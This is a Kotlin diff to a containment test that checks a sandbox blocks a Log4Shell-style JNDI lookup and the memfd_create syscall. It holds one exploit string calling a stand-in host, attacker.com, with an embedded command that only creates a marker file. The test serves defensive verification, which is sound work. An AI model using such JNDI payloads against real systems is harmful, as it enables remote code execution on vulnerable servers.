@@ -26,7 +26,7 @@ class ProtectionDemonstrationTest {
         val marker = File("/tmp/pwned_safe")
         marker.delete()
 
-        val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
+        val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
 
         val ex =
             assertFailsWith<ContainmentViolationException> {
@@ -59,8 +59,8 @@ class ProtectionDemonstrationTest {
                         val res = LinuxNative.withTransaction {
                             LinuxNative.syscall(
                                 arch.memfdCreate.toLong(),
-                                name.address(),
-                                0L,
+                                io.mazewall.core.NativeArg.MemoryArg(name),
+                                io.mazewall.core.NativeArg.NullArg,
                             )
                         }
                         assertTrue(res is LinuxNative.SyscallResult.Error, "memfd_create should be blocked by NO_EXEC")
